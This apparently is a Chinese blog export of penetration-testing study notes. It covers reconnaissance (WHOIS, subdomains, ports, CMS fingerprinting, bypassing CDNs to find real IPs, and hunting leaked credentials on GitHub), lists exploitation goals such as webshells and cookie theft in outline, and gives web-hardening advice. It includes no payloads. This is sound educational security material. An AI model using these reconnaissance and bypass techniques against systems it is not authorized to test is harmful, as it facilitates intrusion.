<p>注册人的姓名和邮箱信息通常对测试个人站点非常有用，因为我们可以通过搜索引擎和社交网络挖掘出域名所有人的很多信息。对中小站点而言，域名所有人往往就是管理员。</p>
<p>kali可以在线查，在线Whois查询的常用网站有爱站工具网（<a href="https://whois.aizhan.com)、站长之家(http//whois.chinaz.com%EF%BC%89%E5%92%8CVirusTotal%EF%BC%88https://www.virustotal.com%EF%BC%89%EF%BC%8C%E9%80%9A%E8%BF%87%E8%BF%99%E4%BA%9B%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%90%8D%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%95%86%E3%80%81%E5%9F%9F%E5%90%8D%E6%8B%A5%E6%9C%89%E8%80%85%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BB%96%E4%BB%AC%E7%9A%84%E9%82%AE%E7%AE%B1%E3%80%81%E7%94%B5%E8%AF%9D%E3%80%81%E5%9C%B0%E5%9D%80%E7%AD%89%E3%80%82">https://whois.aizhan.com）、站长之家（http://whois.chinaz.com）和VirusTotal（https://www.virustotal.com），通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</a></p>
<h5 id="2-1-2-备案信息查询"><a href="#2-1-2-备案信息查询" class="headerlink" title="2.1.2 备案信息查询"></a>2.1.2 备案信息查询</h5><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p>
<p>常用的网站有以下这两个。</p>
<p>● ICP备案查询网：<a href="http://www.beianbeian.com./">http://www.beianbeian.com。</a></p>
<p>● 天眼查：<a href="http://www.tianyancha.com./">http://www.tianyancha.com。</a></p>
<h4 id="2-2-收集敏感信息"><a href="#2-2-收集敏感信息" class="headerlink" title="2.2 收集敏感信息"></a>2.2 收集敏感信息</h4><blockquote>
<p>google搜搜引擎</p>
<p>github(数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等。)</p>
<p>bp的repeater模块(go运行后，右侧的response模块中可以获取一些服务器的信息)</p>
<p>wy漏洞表查看历史漏洞信息</p>
</blockquote>
<h4 id="2-3-收集子域名信息"><a href="#2-3-收集子域名信息" class="headerlink" title="2.3 收集子域名信息"></a>2.3 收集子域名信息</h4><p>主域攻不下来，那就转二级域名。</p>
<p>子域搜索方法：</p>
<p><strong>1.子域名检测工具</strong></p>
<blockquote>
<p>用于子域名检测的工具主要有<strong>Layer子域名挖掘机</strong>、K8、wydomain、<strong>Sublist3r</strong>、dnsmaper、<strong>subDomainsBrute</strong>、Maltego CE等。</p>
</blockquote>
<p><strong>2.搜索引擎枚举</strong></p>
<blockquote>
<p>Google语法搜索子域名</p>
<p>比如site:baidu.com</p>
</blockquote>
<p><strong>3.第三方聚合应用枚举</strong></p>
<blockquote>
<p>很多第三方服务汇聚了大量DNS数据集，可通过它们检索某个给定域名的子域名。只需在其搜索栏中输入域名，就可检索到相关的域名信息</p>
<p>DNSdumpster网站（<a href="https://dnsdumpster.com/%EF%BC%89%E3%80%81%E5%9C%A8%E7%BA%BFDNS%E4%BE%A6%E6%9F%A5%E5%92%8C%E6%90%9C%E7%B4%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98%E5%87%BA%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%BD%9C%E8%97%8F%E7%9A%84%E5%A4%A7%E9%87%8F%E5%AD%90%E5%9F%9F%E3%80%82">https://dnsdumpster.com/）、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域。</a></p>
</blockquote>
<p><strong>4.证书透明度公开日志枚举</strong></p>
<blockquote>
<p>证书透明度（Certificate Transparency,CT）是证书授权机构（CA）的一个项目，证书授权机构会将每个SSL&#x2F;TLS证书发布到公共日志中。一个SSL&#x2F;TLS证书通常包含域名、子域名和邮件地址，这些也经常成为攻击者非常希望获得的有用信息。查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志。</p>
<p>网站推荐：</p>
<p>crt.sh:<a href="https://crt.sh/">https://crt.sh</a></p>
<p>censys:<a href="https://censys.io/">https://censys.io</a></p>
<p>子域名爆破网站（<a href="https://phpinfo.me/domain%EF%BC%89">https://phpinfo.me/domain）</a></p>
<p>IP反查绑定域名网站（<a href="http://dns.aizhan.com)等./">http://dns.aizhan.com）等。</a></p>
</blockquote>
<h4 id="2-4-收集常用端口信息"><a href="#2-4-收集常用端口信息" class="headerlink" title="2.4 收集常用端口信息"></a>2.4 收集常用端口信息</h4><p>在渗透测试的过程中，对端口信息的收集是一个很重要的过程，通过扫描服务器开放的<strong>端口以及从该端口判断服务器上存在的服务</strong>，就可以对症下药，便于我们渗透目标服务器。</p>
<p>所以在端口渗透信息的收集过程中，我们需要关注常见应用的默认端口和在端口上运行的服务。</p>
<p>最常见的扫描工具就是<strong>Nmap，无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具。</strong></p>
<p>下面是一些服务端口汇总。</p>
<p><strong>文件共享服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620095745239.png" alt="文件共享服务端口"></p>
<p><strong>远程连接服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620095825365.png" alt="远程连接服务端口"></p>
<p><strong>Web应用服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100023068.png" alt="Web应用服务端口"></p>
<p><strong>数据库服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100101221.png" alt="数据库服务端口"></p>
<p><strong>邮件服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100159897.png" alt="邮件服务端口"></p>
<p><strong>网络常见协议端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100237114.png" alt="网络常见协议端口"></p>
<p><strong>特殊服务端口</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620100307483.png" alt="特殊服务端口"></p>
<h4 id="2-5-指纹识别"><a href="#2-5-指纹识别" class="headerlink" title="2.5 指纹识别"></a>2.5 指纹识别</h4><p>指纹由于其终身不变性、唯一性和方便性，几乎已成为生物特征识别的代名词。这里所讲的指纹是指<strong>网站CMS指纹识别</strong>、<strong>计算机操作系统及Web容器的指纹识别</strong>等。</p>
<p>应用程序一般在html、js、css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator&#x3D;wordpress 3.xx，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS，所以叫作指纹识别。</p>
<p>对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<h5 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h5><p>CMS（Content Management System）又称整站系统或文章系统。在2004年以前，如果想进行网站内容管理，基本上都靠手工维护，但在信息爆炸的时代，完全靠手工完成会相当痛苦。所以就出现了CMS，开发者只要给客户一个软件包，<strong>客户自己安装配置好，就可以定期更新数据来维护网站</strong>，节省了大量的人力和物力。</p>
<blockquote>
<p>常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等。</p>
</blockquote>
<p>代表工具有御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
<p>还有一些在线网站查询CMS</p>
<blockquote>
<p>● BugScaner:<a href="http://whatweb.bugscaner.com/look/%E3%80%82">http://whatweb.bugscaner.com/look/。</a></p>
<p>● 云悉指纹：<a href="http://www.yunsee.cn/finger.html%E3%80%82">http://www.yunsee.cn/finger.html。</a></p>
<p>● 和WhatWeb:<a href="https://whatweb.net/%E3%80%82">https://whatweb.net/。</a></p>
</blockquote>
<h4 id="2-6-查找真实IP"><a href="#2-6-查找真实IP" class="headerlink" title="2.6 查找真实IP"></a>2.6 查找真实IP</h4><p>在渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来确定目标服务器的真实IP对渗透测试来说就很重要。如果目标服务器不存在CDN，可以直接通过<a href="http://www.ip138.com获取目标的一些ip及域名信息.如果有cdn,就需要绕过cdn寻找目标服务器的真实ip./">www.ip138.com获取目标的一些IP及域名信息。如果有CDN，就需要绕过CDN寻找目标服务器的真实IP。</a></p>
<h5 id="2-6-1-目标服务器存在CDN"><a href="#2-6-1-目标服务器存在CDN" class="headerlink" title="2.6.1.目标服务器存在CDN"></a>2.6.1.目标服务器存在CDN</h5><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。</p>
<blockquote>
<p>就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经<strong>常访问</strong>的<strong>静态数据资源</strong>（例如静态的html、css、js图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服务器上响应给用户，当用户<strong>有实际数据交互</strong>时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
</blockquote>
<h5 id="2-6-2-目标是否使用了CDN"><a href="#2-6-2-目标是否使用了CDN" class="headerlink" title="2.6.2 目标是否使用了CDN"></a>2.6.2 目标是否使用了CDN</h5><p>通常会通过ping目标主域，<strong>观察域名的解析情况</strong>，以此来判断其是否使用了CDN。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620101005067.png" alt="ping命令"></p>
<p>还可以利用在线网站17CE（<a href="https://www.17ce.com)进行全国多地区的ping服务器操作,然后对比每个地区ping出的ip结果,查看这些ip是否一致,**如果都是一样的,极有可能不存在cdn.**如果ip大多不太一样或者规律性很强,可以尝试**查询这些ip的归属地**,判断是否存在cdn.(多地ping)/">https://www.17ce.com）进行全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致，**如果都是一样的，极有可能不存在CDN。**如果IP大多不太一样或者规律性很强，可以尝试**查询这些IP的归属地**，判断是否存在CDN。（多地ping）</a></p>
<h5 id="2-6-3-绕过CDN"><a href="#2-6-3-绕过CDN" class="headerlink" title="2.6.3 绕过CDN"></a>2.6.3 绕过CDN</h5><blockquote>
<p>● <strong>内部邮箱源</strong>。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP,ping这个邮件服务器的域名，就可以获得目标的真实IP（注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）。</p>
<p>● <strong>扫描网站测试文件</strong>，如phpinfo、test等，从而找到目标的真实IP。</p>
<p>● <strong>分站域名</strong>。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站<strong>不是同一个IP但在同一个C段</strong>下面的情况，从而能判断出目标的真实IP段。</p>
<p>● <strong>国外访问</strong>。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站App Synthetic Monitor（<a href="https://asm.ca.com/en/ping.php%EF%BC%89%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%BE%97%E5%88%B0%E7%9C%9F%E5%AE%9E%E7%9A%84IP%EF%BC%8C">https://asm.ca.com/en/ping.php）访问，可能会得到真实的IP，</a></p>
<p>● <strong>查询域名的解析记录</strong>。也许目标很久以前并没有用过CDN，所以可以通过网站NETCRAFT（<a href="https://www.netcraft.com/%EF%BC%89%E6%9D%A5%E8%A7%82%E5%AF%9F%E5%9F%9F%E5%90%8D%E7%9A%84IP%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%A4%A7%E8%87%B4%E5%88%86%E6%9E%90%E5%87%BA%E7%9B%AE%E6%A0%87%E7%9A%84%E7%9C%9F%E5%AE%9EIP%E6%AE%B5%E3%80%82">https://www.netcraft.com/）来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</a></p>
<p>● <strong>如果目标网站有自己的App</strong>，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。</p>
<p>● <strong>绕过CloudFlare CDN查找真实IP</strong>。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站Cloud FlareWatch（<a href="http://www.crimeflare.us/cfs.html#box%EF%BC%89%E5%AF%B9CloudFlare%E5%AE%A2%E6%88%B7%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E7%9C%9F%E5%AE%9EIP%E6%9F%A5%E8%AF%A2">http://www.crimeflare.us/cfs.html#box）对CloudFlare客户网站进行真实IP查询</a></p>
</blockquote>
<h5 id="2-6-4-验证获取的ip"><a href="#2-6-4-验证获取的ip" class="headerlink" title="2.6.4 验证获取的ip"></a>2.6.4 验证获取的ip</h5><p>如果是Web，最简单的验证方法是直接尝试用IP访问，<strong>看看响应的页面是不是和访问域名返回的一样</strong>；或者在目标段比较大的情况下，借助类似Masscan的工具批扫描对应IP段中所有开了80、443、8080端口的IP，然后逐个尝试IP访问，<strong>观察响应结果是否为目标站点</strong>。</p>
<h4 id="2-7-收集敏感目录文件"><a href="#2-7-收集敏感目录文件" class="headerlink" title="2.7 收集敏感目录文件"></a>2.7 收集敏感目录文件</h4><p>探测Web目录结构和隐藏的敏感文件是一个必不可少的环节，从中可以获取网站的<strong>后台管理页面</strong>﹑<strong>文件上传界面</strong>，甚至可能<strong>扫描出网站的源代码</strong>。</p>
<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py（轻量级快速单文件目录后台扫描）、Sensitivefilescan（轻量级快速单文件目录后台扫描）、Weakfilescan（轻量级快速单文件目录后台扫描）等工具。</p>
<p>或者在线网址：</p>
<p>WebScan（<a href="http://www.webscan.cc/%EF%BC%89">http://www.webscan.cc/）</a></p>
<h4 id="2-8-社会工程学"><a href="#2-8-社会工程学" class="headerlink" title="2.8 社会工程学"></a>2.8 社会工程学</h4><p>攻击者通过操纵人的心理、社交工具或其他手段，诱使受攻击者泄露敏感信息、提供访问权限或执行恶意操作的一种攻击方式。这种攻击利用了人们的信任、好奇心、急迫性或其他心理因素，从而绕过技术安全防护措施。</p>
<p>常见方式有:</p>
<blockquote>
<ul>
<li>钓鱼攻击：通过伪装成合法的通信或网站，诱使受害者提供个人信息、登录凭证、银行账号等。</li>
<li>点击劫持攻击：将一个透明的层覆盖在正常网页上，欺骗用户点击某些看似无害的区域，实际上触发了恶意操作。</li>
<li>假冒身份：冒充信任的个人或机构，通过电话、电子邮件或其他通信方式，欺骗受害者提供敏感信息。</li>
<li>社交工具欺骗：通过社交媒体、即时通讯应用等，冒充朋友或熟人的身份，获取信息或诱导行为。</li>
<li>垃圾邮件和钓鱼邮件：通过发送虚假的电子邮件，诱使受害者点击恶意链接、下载恶意附件或提供个人信息。</li>
</ul>
<p>还有社工库。</p>
</blockquote>
<h2 id="2-漏洞环境搭建"><a href="#2-漏洞环境搭建" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h2><p>linux系统LANMP、vulhub</p>
<p>Windows系统WAMP</p>
<p>安装一个phpstudy之后，去github找以下靶场，安装进对应www文件夹即可</p>
<blockquote>
<p>DVWA</p>
<p>sql-labs</p>
<p>xss-labs</p>
<p>pikachu</p>
</blockquote>
<p>还有在线靶场如hack the box</p>
<h2 id="3-渗透工具"><a href="#3-渗透工具" class="headerlink" title="3.渗透工具"></a>3.渗透工具</h2><h4 id="3-1-sqlmap"><a href="#3-1-sqlmap" class="headerlink" title="3.1 sqlmap"></a>3.1 sqlmap</h4><p>SQLMap是一个自动化的SQL注入工具，其主要功能是扫描、发现并利用给定URL的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB。SQLMap采用了以下5种独特的SQL注入技术。</p>
<p>● 基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>● 基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行（即页面返回时间是否增加）来判断。</p>
<p>● 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中。</p>
<p>● 联合查询注入，在可以使用Union的情况下的注入。</p>
<p>● 堆查询注入，可以同时执行多条语句时的注入。</p>
<h3 id="3-漏洞发现"><a href="#3-漏洞发现" class="headerlink" title="3.漏洞发现"></a>3.漏洞发现</h3><p>传统漏洞</p>
<p>框架组件公开漏洞</p>
<p>口令漏洞</p>
<p>代码审计0day</p>
<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230603172605460.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>web防护及识别</title>
    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
<blockquote>
<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
</blockquote>
<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
<blockquote>
<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
</blockquote>
<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
<blockquote>
<p>·目标的端口号（确认攻击目标有哪些）。</p>
<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
<p>·目标是否有明显漏洞等信息。</p>
</blockquote>
<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
<p><code>#nmap -sS 192.168.1.1</code></p>
<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
<p>如果配置文件不设置的话，就是默认配置。</p>
<p>当然了，如果没发现目标端口</p>
<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
<blockquote>
<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
</blockquote>
<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
<blockquote>
<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
</blockquote>
<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
<p>攻击者获得目标服务器的banner信息方式为：</p>
<blockquote>
<p>1.利用NMAP进行扫描</p>
<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
</blockquote>
<blockquote>
<p>2.利用非正常页面查看banner信息</p>
<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
</blockquote>
<blockquote>
<p>3.抓取服务器response包一样会有服务器信息</p>
<p>见bp抓的响应包中的server。</p>
</blockquote>
<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
<p>几个中间件的banner修改方案如下：</p>
<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
<p>关闭版本号显示的方法如下：</p>
<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
</blockquote>
<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
